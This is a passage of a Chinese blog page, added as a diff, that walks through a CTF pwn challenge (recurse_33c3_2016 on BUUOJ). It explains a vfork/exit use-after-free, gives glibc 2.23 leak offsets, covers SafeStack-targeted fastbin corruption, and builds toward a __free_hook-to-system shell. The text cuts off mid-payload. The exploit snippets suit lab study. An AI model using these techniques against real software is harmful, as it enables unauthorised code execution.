@@ -1,0 +1,889 @@
+<!doctype html>
+<html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
+  data-bs-theme="auto" data-palette="blue">
+  <head><script src="/assets/init/bundle.min.36d0987006a4b9c3341e62a9e55cd9446b790bd2367575177aa5d794949c7cf0.js" integrity="sha256-NtCYcAakucM0HmKp5VzZRGt5C9I2dXUXeqXXlJScfPA=" crossorigin="anonymous"></script>
+<meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>recurse_33c3_2016 WP - 微风的龙</title>
+    <link rel="icon" href="/favicon_hu_912579ba8553ef86.png" sizes="16x16" type="image/png">
+    <link rel="icon" href="/favicon_hu_220d0e60e04d07f1.png" sizes="32x32" type="image/png">
+    <link rel="icon" href="/favicon_hu_e404a0b940aa1839.png" sizes="150x150" type="image/png">
+    <link rel="apple-touch-icon" href="/favicon_hu_603e3ce51eff6377.png" sizes="180x180" type="image/png">
+    <link rel="icon" href="/favicon_hu_149e475083d0f0f9.png" sizes="192x192" type="image/png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#6f42c1">
+<meta name="keywords" content="博客, Hugo, PWN, BUUOJ, 个人主页" />
+  <meta name="description" content="recurse_33c3_2016 WP
+保护:
+Arch: amd64-64-little
+RELRO: Full RELRO
+Stack: No canary found
+NX: NX enabled
+PIE: PIE enabled
+
+
+一、程序逻辑
+程序启动后先问名字，然后进入一个菜单:
+welcome to recurse
+what&#39;s your name?
+Hi, &lt;name&gt;
+What would you like to do?
+1) recurse
+2) recurse!!!
+3) recurse?!
+4) iterate
+菜单对应逻辑大致是：" />
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="recurse_33c3_2016 WP">
+  <meta name="twitter:description" content="recurse_33c3_2016 WP保护:
+Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 一、程序逻辑程序启动后先问名字，然后进入一个菜单:
+welcome to recurse what&#39;s your name? Hi, &lt;name&gt; What would you like to do? 1) recurse 2) recurse!!! 3) recurse?! 4) iterate 菜单对应逻辑大致是：">
+<meta property="og:url" content="https://weifengdel0ng.github.io/buu/%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E9%A1%B5/26-1-1/recurse_33c3_2016-wp/">
+  <meta property="og:site_name" content="微风的龙">
+  <meta property="og:title" content="recurse_33c3_2016 WP">
+  <meta property="og:description" content="recurse_33c3_2016 WP保护:
+Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 一、程序逻辑程序启动后先问名字，然后进入一个菜单:
+welcome to recurse what&#39;s your name? Hi, &lt;name&gt; What would you like to do? 1) recurse 2) recurse!!! 3) recurse?! 4) iterate 菜单对应逻辑大致是：">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="buu">
+    <meta property="article:published_time" content="2026-04-16T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-04-16T00:00:00+00:00">
+    <meta property="article:tag" content="BUU">
+
+  <meta itemprop="name" content="recurse_33c3_2016 WP">
+  <meta itemprop="description" content="recurse_33c3_2016 WP保护:
+Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 一、程序逻辑程序启动后先问名字，然后进入一个菜单:
+welcome to recurse what&#39;s your name? Hi, &lt;name&gt; What would you like to do? 1) recurse 2) recurse!!! 3) recurse?! 4) iterate 菜单对应逻辑大致是：">
+  <meta itemprop="datePublished" content="2026-04-16T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-04-16T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1791">
+  <meta itemprop="keywords" content="BUU">
+
+<link data-precache rel="stylesheet" href="/assets/main/bundle.min.db20b90f1e018f02fe452451fb9603d42007e5f5abc40cd58ddadfec0d7764f3.css" integrity="sha256-2yC5Dx4BjwL+RSRR+5YD1CAH5fWrxAzVjdrf7A13ZPM=" crossorigin="anonymous">
+<link data-precache rel="stylesheet" href="https://weifengdel0ng.github.io/css/home.css" crossorigin="anonymous">
+
+    <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
+
+
+</head>
+  <body><header class="mb-4 sticky-top">
+  
+<nav class="top-app-bar shadow navbar navbar-expand-xxl">
+  <div class="container">
+<a class="navbar-brand d-flex align-items-center flex-grow-1 flex-xxl-grow-0 justify-content-xxl-start ms-2 ms-xxl-0 mx-auto me-xxl-2"
+    href="https://weifengdel0ng.github.io/">微风的龙
+</a>
+
+    <div class="offcanvas-xxl offcanvas-end flex-grow-1" data-bs-scroll="true" tabindex="-1" id="navbarMenus" aria-labelledby="navbarMenusLabel">
+      <div class="offcanvas-header px-4 pb-0">
+        <div class="offcanvas-title h5" id="navbarMenusLabel">微风的龙</div>
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="offcanvas" data-bs-target="#navbarMenus" aria-label="Close"></button>
+      </div>
+      <div class="offcanvas-body p-4 pt-0 p-xxl-0">
+        <hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center me-auto"><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/">首页
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/posts/">文章
+            </a>
+          </li><li class="nav-item col-6 col-xxl-auto">
+            <a class="nav-link py-2 px-0 px-xxl-2" href="https://weifengdel0ng.github.io/about/">关于
+            </a>
+          </li>
+        </ul>
+        
+    <hr class="d-xxl-none">
+    <form class="search-bar ms-auto my-auto" action="" novalidate>
+      <div class="input-group align-items-center">
+        <span class="btn btn-search disabled position-absolute left-0 border-0 px-1">
+          <i class="fas fa-fw fa-search fa-lg"></i>
+        </span>
+        <input
+          class="my-1 form-control border-white rounded-5 search-input bg-body"
+          name="q"
+          type="search"
+          placeholder="搜索"
+          aria-label="Search"
+          required>
+          <span class="search-shortcut position-absolute end-0 top-0 me-2">
+            <kbd class="text-dark bg-white opacity-75 rounded-3 shadow border border-primary py-1 fw-bold">/</kbd>
+          </span>
+      </div>
+    </form><hr class="d-xxl-none">
+        <ul class="navbar-nav flex-row flex-wrap align-items-center ms-md-auto">
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="paletteDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="fas fa-fw fa-palette"></i>
+        <span class="d-xxl-none">配色</span>
+    </a>
+    <ul class="palette-dropdown-menu dropdown-menu dropdown-menu-end px-2 row g-2" aria-labelledby="paletteDropdown">
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue" aria-label="蓝色"
+                    class="btn btn-sm w-100 palette text-bg-blue" data-palette="blue">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-blue-gray" aria-label="蓝灰色"
+                    class="btn btn-sm w-100 palette text-bg-blue-gray" data-palette="blue-gray">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-brown" aria-label="棕色"
+                    class="btn btn-sm w-100 palette text-bg-brown" data-palette="brown">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-cyan" aria-label="青色"
+                    class="btn btn-sm w-100 palette text-bg-cyan" data-palette="cyan">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-green" aria-label="绿色"
+                    class="btn btn-sm w-100 palette text-bg-green" data-palette="green">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-indigo" aria-label="靛青色"
+                    class="btn btn-sm w-100 palette text-bg-indigo" data-palette="indigo">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-orange" aria-label="橙色"
+                    class="btn btn-sm w-100 palette text-bg-orange" data-palette="orange">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-pink" aria-label="粉色"
+                    class="btn btn-sm w-100 palette text-bg-pink" data-palette="pink">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-purple" aria-label="紫色"
+                    class="btn btn-sm w-100 palette text-bg-purple" data-palette="purple">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-red" aria-label="红色"
+                    class="btn btn-sm w-100 palette text-bg-red" data-palette="red">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-teal" aria-label="蓝绿色"
+                    class="btn btn-sm w-100 palette text-bg-teal" data-palette="teal">
+                </a>
+            </li>
+            <li class="col-4 my-1">
+                <a role="button" id="palette-yellow" aria-label="黄色"
+                    class="btn btn-sm w-100 palette text-bg-yellow" data-palette="yellow">
+                </a>
+            </li>
+    </ul>
+</li>
+<li class="nav-item dropdown col-6 col-xxl-auto">
+    <a class="nav-link px-0 py-2 px-xxl-1" href="#" id="modeDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+        <i class="mode-icon fas fa-fw fa-adjust" id="modeIcon"></i>
+        <span class="d-xxl-none">模式</span>
+    </a>
+    <ul class="mode-dropdown-menu dropdown-menu dropdown-menu-end" aria-labelledby="modeDropdown">
+        <li class="mode-item" data-color-mode="light" data-icon="sun">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-sun"></i> 浅色
+            </button>
+        </li>
+        <li class="mode-item" data-color-mode="dark" data-icon="moon">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-moon"></i> 深色
+            </button>
+        </li>
+        <li class="mode-item active" data-color-mode="auto" data-icon="adjust">
+            <button class="dropdown-item">
+                <i class="mode-icon fas fa-fw fa-adjust"></i> 自动
+            </button>
+        </li>
+    </ul>
+</li>
+        </ul>
+      </div>
+    </div>
+    <div class="d-flex">
+      <button class="navbar-toggler order-5 border-0" type="button" data-bs-toggle="offcanvas" data-bs-target="#navbarMenus"
+        aria-controls="navbarMenus" aria-expanded="false" aria-label="Toggle navigation">
+        <i class="fas fa-ellipsis-h"></i>
+      </button>
+    </div>
+  </div>
+</nav>
+
+</header>
+
+    <main class="container has-sidebar" data-kind="page"><script data-precache src="/js/main-init.f7179afb1166ccce2102740afe4caf205dbc623896eb19a268f6cb9367e6eea6.js" integrity="sha256-9xea&#43;xFmzM4hAnQK/kyvIF28YjiW6xmiaPbLk2fm7qY=" crossorigin="anonymous"></script>
+
+      <div class="row content"><noscript>
+    <div class="alert alert-danger" role="alert">你的浏览器不支持 JavaScript。</div>
+</noscript>
+
+<div class="content-posts col-xxl-8">
+  <div class="container"><div class="post-panel-wrapper position-relative d-flex justify-content-center">
+  <div class="d-flex flex-row justify-content-center rounded-5 border post-panel position-fixed px-3 py-1 surface shadow-1">
+    
+    
+
+    
+    
+    
+  <a class="action action-toc d-none d-xxl-block" href="#postTOC" role="button" title="目录">
+    <i class="fas fa-fw fa-list-alt"></i>
+  </a>
+<a class="action action-toc d-block d-xxl-none" href="#post-toc-container" role="button" title="目录">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+    <a class="action action-copyright" href="#post-copyright" role="button" aria-label="Copyright" title="版权">
+  <i class="fas fa-fw fa-copyright"></i>
+</a>
+    <a class="action action-post-comments" href="#post-comments" role="button" aria-label="Comments" title="评论">
+  <i class="fas fa-fw fa-comments"></i>
+</a>
+    
+<a id="sidebarToggler" class="action action-sidebar-toggler d-none d-xxl-block" role="button" title="切换侧边栏">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+
+    
+  </div>
+</div><article class="row card component mb-4 post">
+  <div class="card-header ">
+    <h1 class="card-title post-title my-2">recurse_33c3_2016 WP</h1>
+  </div>
+  <div class="card-body"><div class="post-meta mb-3">
+  <span class="post-date me-1 mb-1" title="创建于 2026-04-16 08:00:00 &#43;0800 CST。">April 16, 2026</span><span class="post-reading-time me-1 mb-1">4 分钟阅读</span><a href="/categories/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-category">
+      <i class="fas fa-fw fa-folder me-1"></i>BUU</a><a href="/tags/buu/" class="btn btn-sm btn-secondary mb-1 me-2 py-0 pe-1 post-taxonomy post-taxonomy-sm post-tag">BUU</a>
+</div>
+
+<div class="mt-2 mb-3 d-block d-xxl-none">
+    <h2 class="text-surface mb-3">目录</h2>
+    <div id="post-toc-container">
+        </div>
+    <hr class="text-secondary">
+</div><div class="post-content mb-3" data-bs-spy="scroll" data-bs-target="#TableOfContents" tabindex="0">
+        <div id="post-content-body">
+<h1 id="recurse_33c3_2016-wp" data-numberify>recurse_33c3_2016 WP<a class="anchor ms-1" href="#recurse_33c3_2016-wp"></a></h1>
+<p>保护:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Arch: amd64-64-little
+</span></span><span style="display:flex;"><span>RELRO: Full RELRO
+</span></span><span style="display:flex;"><span>Stack: No canary found
+</span></span><span style="display:flex;"><span>NX: NX enabled
+</span></span><span style="display:flex;"><span>PIE: PIE enabled
+</span></span></code></pre></div><hr>
+
+<h2 id="一程序逻辑" data-numberify>一、程序逻辑<a class="anchor ms-1" href="#一程序逻辑"></a></h2>
+<p>程序启动后先问名字，然后进入一个菜单:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>welcome to recurse
+</span></span><span style="display:flex;"><span>what&#39;s your name?
+</span></span><span style="display:flex;"><span>Hi, &lt;name&gt;
+</span></span><span style="display:flex;"><span>What would you like to do?
+</span></span><span style="display:flex;"><span>1) recurse
+</span></span><span style="display:flex;"><span>2) recurse!!!
+</span></span><span style="display:flex;"><span>3) recurse?!
+</span></span><span style="display:flex;"><span>4) iterate
+</span></span></code></pre></div><p>菜单对应逻辑大致是：</p>
+<ul>
+<li><code>1) recurse</code>
+递归调用当前 challenge 对象</li>
+<li><code>2) recurse!!!</code>
+新建一个 challenge 对象，再递归进去</li>
+<li><code>3) recurse?!</code>
+<code>vfork()</code> 一个子进程，然后 <code>execl(&quot;/proc/self/exe&quot;, &quot;fork&quot;, name, NULL)</code></li>
+<li><code>4) iterate</code>
+什么都不做，继续循环</li>
+<li><code>&gt;4</code>
+返回上一层</li>
+</ul>
+<p>这个题的关键不是传统栈溢出，而是 <code>C++ 对象 + vfork + destructor + SafeStack</code> 组合出的 UAF。</p>
+<hr>
+
+<h2 id="二核心漏洞点" data-numberify>二、核心漏洞点<a class="anchor ms-1" href="#二核心漏洞点"></a></h2>
+
+<h3 id="1-option-3-的危险行为" data-numberify>1. option 3 的危险行为<a class="anchor ms-1" href="#1-option-3-的危险行为"></a></h3>
+<p><code>3) recurse?!</code> 最终会走到类似下面的逻辑：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">vfork</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (pid <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">execl</span>(<span style="color:#e6db74">&#34;/proc/self/exe&#34;</span>, <span style="color:#e6db74">&#34;fork&#34;</span>, current_name, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span>(<span style="color:#ae81ff">1</span>, ...);   <span style="color:#75715e">// 如果 execl 失败，这里会 exit()
+</span></span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">waitpid</span>(pid, ...);
+</span></span></code></pre></div><p>问题在于：</p>
+<ul>
+<li><code>vfork()</code> 之后，子进程和父进程共享地址空间，直到子进程 <code>execve</code> 或 <code>_exit</code></li>
+<li>这里如果 <code>execl()</code> 失败，就会进入 <code>err()</code></li>
+<li><code>err()</code> 内部会调用 <code>exit()</code></li>
+<li><code>exit()</code> 会执行全局对象析构函数</li>
+</ul>
+<p>这就把<strong>父进程还在用的全局 C++ 对象提前析构掉了</strong></p>
+<p>也就是：</p>
+<ul>
+<li>全局对象被 <code>free</code></li>
+<li>父进程继续运行</li>
+<li>形成 <strong>use-after-free</strong></li>
+</ul>
+<hr>
+
+<h2 id="三为什么可以让-execl-失败" data-numberify>三、为什么可以让 execl 失败<a class="anchor ms-1" href="#三为什么可以让-execl-失败"></a></h2>
+<p>这个题里 <code>execl</code> 的第三个参数是当前字符串内容。</p>
+<p>只要把当前字符串做得足够大，<code>execve</code> 处理参数时就会失败，于是会走到 <code>err()-&gt;exit()</code> 这条危险路径。</p>
+<p>原始利用里用的是一个非常长的名字：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">4095</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">34</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">61</span>)
+</span></span></code></pre></div><p>这样就能稳定触发 <code>execl</code> 失败，从而把全局对象打成 UAF。</p>
+<hr>
+
+<h2 id="四safestack-对利用的影响" data-numberify>四、SafeStack 对利用的影响<a class="anchor ms-1" href="#四safestack-对利用的影响"></a></h2>
+<p>这题开启了 clang 的 <code>SafeStack</code>。</p>
+<p>它会把：</p>
+<ul>
+<li>返回地址等“安全数据”放在 safe stack</li>
+<li>普通局部对象、字符串对象等放在 unsafe stack</li>
+</ul>
+<p>这意味着：</p>
+<ol>
+<li>传统覆盖返回地址的打法不适合</li>
+<li>但是 unsafe stack 和 libc 的相对位置是稳定的</li>
+<li>题目可以通过 UAF + 堆风水 + SafeStack 固定偏移，最终把堆分配导向 unsafe stack</li>
+</ol>
+<p>这也是这题最核心的利用思路。</p>
+<hr>
+
+<h2 id="五利用思路总览" data-numberify>五、利用思路总览<a class="anchor ms-1" href="#五利用思路总览"></a></h2>
+<p>整体利用链是：</p>
+<ol>
+<li>进入递归，准备一批特定大小的 <code>std::string</code></li>
+<li>触发 <code>vfork + err + exit</code>，把全局 challenge 对象析构，制造 UAF</li>
+<li>继续申请堆块，把被 free 的内容重新占用</li>
+<li>通过大 chunk 泄漏 unsorted bin 指针，拿到 libc</li>
+<li>由 libc 推出 SafeStack 的目标地址</li>
+<li>伪造 fastbin 链，把下一次分配劫持到 SafeStack 上</li>
+<li>再次改写字符串对象的指针，让它指向 <code>__free_hook - 8</code></li>
+<li>写入 <code>sh;#</code> 和 <code>system</code></li>
+<li>触发 <code>free</code>，等价执行：</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;sh;#&#34;</span>)
+</span></span></code></pre></div><ol start="10">
+<li>拿到 shell 后读 flag</li>
+</ol>
+<hr>
+
+<h2 id="六libc-泄漏" data-numberify>六、libc 泄漏<a class="anchor ms-1" href="#六libc-泄漏"></a></h2>
+<p>UAF 之后，利用一批分配把被释放的全局对象内容重新布置。</p>
+<p>接着申请一个较大的 chunk，让它进入 unsorted bin，再从程序打印的字符串内容里拿到 libc 指针。</p>
+<p>在 BUU 这个环境里，泄漏对应的是 <code>glibc 2.23</code> 的 unsorted bin 指针，使用的偏移是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc_leak_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3c4b78</span>
+</span></span></code></pre></div><p>所以：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leaked_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3c4b78</span>
+</span></span></code></pre></div><p>我实际打出来的 libc 基址类似：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>0x7fbb628d7000
+</span></span></code></pre></div><hr>
+
+<h2 id="七safestack-偏移" data-numberify>七、SafeStack 偏移<a class="anchor ms-1" href="#七safestack-偏移"></a></h2>
+<p>原始 33c3 远端环境和 BUU 的环境在 SafeStack 相对 libc 的偏移上不一样。</p>
+<p>这个题在 BUU 上稳定可用的是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>safestack <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x408</span>
+</span></span></code></pre></div><p>不是原始 writeup 里那组远端偏移。</p>
+<p>这一步如果错了，后面把 fastbin 打到栈上的阶段就会直接崩。</p>
+<hr>
+
+<h2 id="八堆利用阶段" data-numberify>八、堆利用阶段<a class="anchor ms-1" href="#八堆利用阶段"></a></h2>
+<p>利用中先准备一些 <code>0x51</code> 大小的字符串对象：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+</span></span><span style="display:flex;"><span>    enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x51</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+</span></span><span style="display:flex;"><span>    leave(io)
+</span></span></code></pre></div><p>这一步的作用是：</p>
+<ul>
+<li>在递归层里留下若干满足条件的字符串对象</li>
+<li>后面把 fastbin chunk 打到 SafeStack 上时，需要伪造的对象能通过 size 检查</li>
+</ul>
+<p>之后通过一组固定分配：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>    enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">48</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">9</span>):
+</span></span><span style="display:flex;"><span>    leave(io)
+</span></span></code></pre></div><p>把 unsorted bin 指针泄出来。</p>
+<hr>
+
+<h2 id="九把-fastbin-打到-safestack" data-numberify>九、把 fastbin 打到 SafeStack<a class="anchor ms-1" href="#九把-fastbin-打到-safestack"></a></h2>
+<p>泄漏 libc 后，先把某次分配的目标改成：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p64(safestack)
+</span></span></code></pre></div><p>然后继续布置若干小 chunk：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">15</span>)
+</span></span><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">81</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
+</span></span><span style="display:flex;"><span>    enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">48</span>)
+</span></span></code></pre></div><p>再伪造一些 chunk 元数据：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>enter(io, p64(<span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>enter(io, p64(<span style="color:#ae81ff">0x30</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>enter(io, p64(<span style="color:#ae81ff">0x60</span>))
+</span></span><span style="display:flex;"><span>enter(io, p64(<span style="color:#ae81ff">0x21</span>))
+</span></span></code></pre></div><p>最后：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>enter(io, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;F&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>这一分配会落到 SafeStack 上，并进一步改写上层字符串对象的指针。</p>
+<hr>
+
+<h2 id="十改写-__free_hook" data-numberify>十、改写 __free_hook<a class="anchor ms-1" href="#十改写-__free_hook"></a></h2>
+<p>当字符串对象指针已经可控后，把它改到：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__free_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>
+</span></span></code></pre></div><p>对应 BUU 这边 <code>glibc 2.23</code> 的偏移：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>free_hook_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3c67a8</span>
+</span></span><span style="display:flex;"><span>system_off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x45390</span>
+</span></span></code></pre></div><p>写入内容：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p64(libc_base <span style="color:#f92672">+</span> free_hook_off <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x30</span>)
